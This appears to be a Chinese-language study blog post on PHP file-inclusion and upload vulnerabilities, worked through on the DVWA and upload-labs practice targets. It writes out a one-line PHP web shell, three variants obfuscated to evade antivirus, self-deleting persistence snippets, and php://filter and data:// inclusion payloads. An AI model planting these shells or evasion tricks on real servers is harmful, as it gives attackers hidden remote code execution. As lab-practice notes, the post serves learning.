---
title: PHP文件上传漏洞
date: 2022-01-17 22:05:03
tags:
      - PHP
      - 安全
      - 靶场练习
categories:
      - 安全
description:
keywords:

---

# PHP INCLUDE

靶场使用dvwa和upload lab



如果要使用这个漏洞一定要确保php.ini下的包含如下配置:

>php.ini
>allow_url_include=On
>允许文件包含

phpstudy的操作方法如下



![image-20220120165602813](D:\Code\pojo\Blog\BlogHexo\public\img\PHPinclude-1.png)

然后打开的文件夹即可设置



#### 一句话木马

搞定配置后我们先介绍下一句话木马，一般这两个连着用

一句话木马就是上传一个文件然后让这个文件可以执行php命令，一般采用的函数如下：

>system,exec,eval,assert,shell_exec,popen,proc_popen,passthru

上面这些都是可以执行命令的还有几个

write写文件,preg_replace替换并执行代码,substr_replace

base64_decode进行base64解密



下面是一句话木马格式:

> <?php eval($_POST['cmd']); ?>
>
> 然后访问这个文件,并且用post传递cmd执行命令
>
> POST提交cmd=phpinfo(); //这个用来测试是不是上传成功

##### 免杀

有可能我们上传的文件被防火墙处理了

>==用加密后的eval进行解码执行==
>
><?php 
>//assert的base64加密结果
>$a = base64_decode("YXNzZXJ0");
>$a($_POST['cmd']);
>
>?>
>
>==使用拼接的eval==
>
><?php 
>//assert
>$a="e"."v";
>$b="a"."l";
>$c=$a.$b;
>$c($_POST['cmd']);
>
>?>
>
>==使用替换的方式来进行过滤==
>
><?php 
>function fun(){
>  return $_POST['cmd'];
>}
>//使用正则表达式来执行
>//匹配第三个参数"haha"，正则匹配的内容就是haha，如果匹配到了，替换为fun()函数，并且e（当作php来执行）
>//@不让php输出错误，增加隐蔽功能
>@preg_replace("/haha/e", fun(), "haha")
>
>?>

还有一些其他的函数

>//运行程序只有把程序结束才能删除该文件
>ignore_user_abort(true);
>//设置时间
>set_time_limit(0);
>//自删
>unlink(__FILE__);

##### 一句话木马防御

防御方法：
重启php服务器，可以删除
使用竞争写入
创建一个.index.php名字的文件夹





### dvwa练习



使用伪协议

> file:// 访问本地文件系统
> http:// 访问http网址
> ftp:// 访问ftp服务器
> php:// 访问输入输出流
> zlib:// 访问压缩流
> data:// 访问数据流
> phar:// php归档
> rar:// 访问rar文件
> ogg:// 访问音频
> expect:// 交互式流

dvwa----low难度

![image-20220121090215375](D:\Code\pojo\Blog\BlogHexo\public\img\php_include-dvwa-1.png)

可以看出来直接使用的page=.....

这时候先用伪协议试一试

![image-20220121090335305](D:\Code\pojo\Blog\BlogHexo\public\img\php_include-dvwa-2.png)

发现成功了



dvwa-medium

同样使用上面的方法发现通过

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );

?> 
```

通过源码可以看出,过滤了协议,和不允许目录遍历



dvwa-high

可以使用file去使用路径

![image-20220121091429508](D:\Code\pojo\Blog\BlogHexo\public\img\php_include-dvwa-3.png)



```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```

可以发现只能使用file开头所以只能使用这个伪协议



看看impossible

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```

他只包含这几个文件,如果我们可以替换这几个文件那么也可以破解



##### 老师的做法

>第一种php://filter/read=convert.base64-encode/resource=./index.php
>
>第二种我和老师做的一样
>
>第三种data://text/plain,<?php phpinfo()?>
>data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=



我常用的方法

第一能不能上传文件,上传文件的话直接进行包含使用

第二能不能使用伪协议,能够使用哪种伪协议

